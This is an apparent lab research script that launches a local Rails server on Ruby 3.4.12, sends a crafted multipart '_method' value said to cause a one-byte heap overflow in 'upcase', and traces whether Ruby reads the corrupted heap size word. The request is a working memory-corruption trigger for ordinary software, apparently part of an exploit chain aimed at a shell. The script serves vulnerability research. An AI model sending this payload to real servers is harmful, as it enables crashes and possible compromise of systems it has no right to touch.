#!/usr/bin/env python3
"""One bounded keep-alive pass looking for a live Ruby consumer of the size
word corrupted by the wire-only `_method.to_s.upcase` one-byte overflow.

Stock Rails 3.4.12 (plain glibc), one Puma worker, one connection:
benign Regexp POST -> mixed27 overflow POST -> benign Regexp POST.
LD_PRELOAD only observes malloc and malloc_usable_size; it never modifies
target memory. Pass condition for the *consumer* question: an interposed
malloc_usable_size call from the ruby binary returns a usable size for a
chunk whose raw size header contains the overflow byte 0x53 at the address
`casemap_user + casemap_request`. Without one, no Ruby-side consumer reads the
attacker-corrupted size word before glibc malloc/free does in this sequence.
"""
from __future__ import annotations

import http.client
import json
import os
from pathlib import Path
import resource
import subprocess
import time
from urllib.parse import urlencode

ROOT = Path(__file__).resolve().parents[2]
EV = ROOT / "lab/build/evidence"
APP = ROOT / "lab/build/rails-stock-app"
RUBY = ROOT / "lab/build/plain/ruby-3.4.12-plain/bin/ruby"
BOUNDARY = b"X2SMPBOUND"
PRIMER = "[[:^ascii:][^一]&&x]"


def no_core() -> None:
    resource.setrlimit(resource.RLIMIT_CORE, (0, 0))


def note_body(tag: str) -> bytes:
    return urlencode({"_method": "GET", "tag": tag}).encode()


def method_body() -> bytes:
    payload = b"a" + b"\xdf" * 27
    return (b"--" + BOUNDARY + b"\r\n"
            b'Content-Disposition: form-data; name="_method"\r\n'
            b"Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n"
            + payload + b"\r\n--" + BOUNDARY + b"--\r\n")


def post(conn: http.client.HTTPConnection, path: str, body: bytes, ctype: str) -> int | str:
    try:
        conn.request("POST", path, body=body, headers={
            "Content-Type": ctype, "Content-Length": str(len(body)),
        })
        r = conn.getresponse()
        status = r.status
        r.read()
        return status
    except Exception as exc:
        return f"ERR {type(exc).__name__}: {exc}"


def main() -> int:
    port = int(os.environ.get("RUBY2SHELL_MUS_PORT", "4608"))
    tag = os.environ.get("RUBY2SHELL_MUS_TAG", "musize-keepalive-1")
    log_path = EV / f"{tag}.trace"
    pid_path = EV / f"{tag}.pid"
    arm_path = EV / f"{tag}.arm"
    EV.mkdir(parents=True, exist_ok=True)
    for p in (arm_path, log_path):
        p.unlink(missing_ok=True)

    env = os.environ.copy()
    env["RAILS_MAX_THREADS"] = "1"
    env["LD_PRELOAD"] = str(ROOT / "lab/preload/musize-consumer.so")
    env["RUBY2SHELL_MUS_ARM"] = str(arm_path)
    gem_path = ROOT / "lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0"
    env["GEM_PATH"] = str(gem_path) + ((":" + env["GEM_PATH"]) if env.get("GEM_PATH") else "")
    command = [str(RUBY), str(APP / "bin/rails"), "server", "-b", "127.0.0.1",
               "-p", str(port), "--pid", str(pid_path)]

    result: dict[str, object] = {"tag": tag, "port": port}
    with log_path.open("wb") as log:
        proc = subprocess.Popen(command, cwd=ROOT, env=env, stdout=log,
                                stderr=subprocess.STDOUT, preexec_fn=no_core)
        try:
            ready = False
            for _ in range(300):
                if proc.poll() is not None:
                    break
                try:
                    probe = http.client.HTTPConnection("127.0.0.1", port, timeout=1)
                    probe.request("GET", "/rails/info/notes")
                    probe.getresponse().read()
                    probe.close()
                    ready = True
                    break
                except OSError:
                    time.sleep(0.1)
            result["ready"] = ready
            if ready:
                arm_path.touch()
                time.sleep(0.2)
                conn = http.client.HTTPConnection("127.0.0.1", port, timeout=60)
                result["status_primer"] = post(
                    conn, "/rails/info/notes", note_body(PRIMER),
                    "application/x-www-form-urlencoded")
                result["status_attack"] = post(
                    conn, "/not-a-route", method_body(),
                    "multipart/form-data; boundary=" + BOUNDARY.decode())
                result["status_final"] = post(
                    conn, "/rails/info/notes", note_body(PRIMER),
                    "application/x-www-form-urlencoded")
                conn.close()
                time.sleep(0.2)
                result["exit"] = proc.poll()
        finally:
            if proc.poll() is None:
                proc.terminate()
                try:
                    proc.wait(5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()
            pid_path.unlink(missing_ok=True)
            arm_path.unlink(missing_ok=True)

    mallocs: list[tuple[int, int]] = []
    usable: list[dict[str, object]] = []
    control: list[dict[str, object]] = []
    overlap: list[dict[str, object]] = []
    totals: dict[str, int] = {}
    for line in log_path.read_bytes().splitlines():
        s = line.decode("utf-8", "replace")
        bits = s.split(None, 5)
        if not bits:
            continue
        if bits[0] == "M" and len(bits) >= 3:
            mallocs.append((int(bits[1], 16), int(bits[2])))
        elif len(bits) in (5, 6) and bits[0] in ("U", "C", "W"):
            entry = {
                "ptr": int(bits[1], 16), "header": int(bits[2], 16),
                "usable": int(bits[3]),
                "kind": int(bits[4]) if bits[0] == "W" else 0,
                "caller": bits[5] if bits[0] == "W" else bits[4],
            }
            if bits[0] == "U":
                usable.append(entry)
            elif bits[0] == "C":
                control.append(entry)
            else:
                overlap.append(entry)
        elif len(bits) == 3 and bits[0] == "D":
            totals = {k: int(v) for k, v in (b.split("=", 1) for b in bits[1:])}
    destinations = [p + n for p, n in mallocs]
    ruby_consumers = [u for u in usable if "/bin/ruby" in str(u["caller"])
                      and any(u["ptr"] - 8 <= d < u["ptr"] for d in destinations)]
    any_ruby = [u for u in usable if "/bin/ruby" in str(u["caller"])]
    result.update({
        "casemap_candidates": len(mallocs),
        "usable_0x53_calls": len(usable),
        "usable_0x53_calls_from_ruby": len(any_ruby),
        "ruby_consumers_of_overflow_word": len(ruby_consumers),
        "ruby_calls_total": totals.get("ruby"),
        "usize_calls_on_overflow_size_word": sum(w["kind"] == 2 for w in overlap),
        "usize_calls_on_overflow_prev_size": sum(w["kind"] == 1 for w in overlap),
        "corrupted_header_consumers": sum((w["header"] & 0xff) == 0x53 for w in overlap),
        "sample_overflow_header_consumers": [
            {"ptr": hex(w["ptr"]), "header": hex(w["header"]),
             "usable": w["usable"], "kind": w["kind"], "caller": w["caller"]}
            for w in overlap[:8]
        ],
        "usable_calls_total": totals.get("usable"),
        "sample_control_calls": [
            {"ptr": hex(c["ptr"]), "header": hex(c["header"]),
             "usable": c["usable"], "caller": c["caller"]}
            for c in control[:8]
        ],
        "sample_consumers": [
            {"ptr": hex(u["ptr"]), "header": hex(u["header"]),
             "usable": u["usable"], "caller": u["caller"]}
            for u in ruby_consumers[:12]
        ],
        "trace_bytes": log_path.stat().st_size,
    })
    out = EV / f"{tag}.json"
    out.write_text(json.dumps(result, indent=2) + "\n")
    print(json.dumps(result, indent=2))
    return 0 if result["ready"] is True else 1


if __name__ == "__main__":
    raise SystemExit(main())
